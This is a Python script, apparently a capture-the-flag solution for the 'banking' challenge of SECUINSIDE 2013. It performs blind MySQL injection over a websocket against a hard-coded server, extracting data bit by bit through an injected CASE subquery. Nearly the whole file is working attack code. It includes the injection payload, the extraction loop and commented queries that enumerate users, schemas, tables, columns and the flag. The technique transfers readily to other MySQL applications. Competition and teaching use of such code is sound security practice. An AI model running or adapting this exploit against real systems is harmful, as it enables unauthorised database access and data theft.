# template: blindeye.py
# fast blind MySQLi using bit shifts (exactly 8 requests per char instead of 127 per char)
# modified to pwn the "banking" challenge from secuinside 2013
# by jiva

import urllib2, sys
from websocket import create_connection
import json

# ws = create_connection("ws://1.234.27.139:38088/banking")
ws = create_connection("ws://1.234.27.139:38089/banking")
# ws = create_connection("ws://1.234.27.139:38090/banking")
# ws = create_connection("ws://1.234.27.139:40022/banking")


# perform injection for a given shift amount and check if token is in page source
# _vector: entry point for the sql injection
# _token: a word or phrase which appears in the source code of the page for a successful query
# _q1: the first part of the query (ex: "' or")
# _q2: the subquery to get results for (ex: select group_concat(table_name) from information_schema.tables)
# _pos: character position to bruteforce
# _shift: number of bits to shift the character at position _pos
# _ded: deduced ordinal value of the character shifted _shift bits (used for comparison)
def blindeye(_vector, _token, _q1, _q2, _pos, _shift, _ded):
  # sqli = " " + str(_q1)+ " (ascii((substr((" +str(_q2)+ ")," +str(_pos)+ ",1)))>>" +str(_shift)+ ")=" +str(_ded)+ " -- -"
	sqli = ",(select (case when ( (ascii((substr((" +str(_q2)+ ")," +str(_pos)+ ",1)))>>" +str(_shift)+ ")=" +str(_ded) + ') then balance else user end)) limit 1'
	# sqli = sqli.replace(' ','+')

	# print sqli
	data = {'cmd': 'list_init', 'o': 'balance', 'b': sqli}
	ws.send(json.dumps(data))
	resp = ws.recv()

	if _token in resp: return True
	else: return False

# main
def main():
	# start and end lengths of result to brute force
	res_start_len = 0
	res_end_len = 1000
	
	
	# Don't need vector, I modified blindeye()
	vector = ''
	
	# Don't need q1, I modified blindeye()
	q1 = ""

	# teller@localhost
	# q2 = 'select user()' 
	
	# user_accounts
	# q2 = 'select group_concat(table_name) from information_schema.tables where table_schema=database()'
	
	# information_schema,banking,flag_db,test
	# q2 = 'select group_concat(schema_name) from information_schema.schemata'

	# flag_tbl
	# q2 = 'select group_concat(table_name) from information_schema.tables where table_schema=0x' + 'flag_db'.encode('hex')

	# flag
	# q2 = 'select group_concat(column_name) from information_schema.columns where table_name=0x' + 'flag_tbl'.encode('hex')

	# TheG0d0fGrabs_M4dL1F3
	q2 = 'select flag from flag_db.flag_tbl'


	# q2 = 'select group_concat(schema_name) from information_schema.schemata' # get list of databases
	#q2 = 'select group_concat(table_name) from information_schema.tables' # get list of tables for current database
	#q2 = 'select group_concat(column_name) from information_schema.columns where table_name="users"' # get column names for a table in the current database
	#q2 = 'concat("user: ",user(),0x0a,"system user: ",system_user(),0x0a,"hostname: ",@@hostname,0x0a,"database: ",database(),0x0a,"version: ",version(),0x0a,"install dir: ",@@basedir)' # basic info

	for pos in xrange(res_start_len,res_end_len):
		# Get token frequently bc it changes a LOT
		data = {'cmd': 'list_init', 'o': 'balance', 'b': ',(select (case when (1=1) then balance else user end)) limit 1'}
		ws.send(json.dumps(data))
		token = ws.recv()

		bitstr = ''
		for shift in xrange(7,-1,-1):
			ded0 = int(bitstr+'0', 2)
			ded1 = int(bitstr+'1', 2)
			if blindeye(vector, token, q1, q2, pos, shift, ded0): bitstr += '0'
			else: bitstr += '1'
		sys.stdout.write(chr(int(bitstr,2)))
		sys.stdout.flush()
	print

# boilerplate
if __name__ == '__main__':
	main()
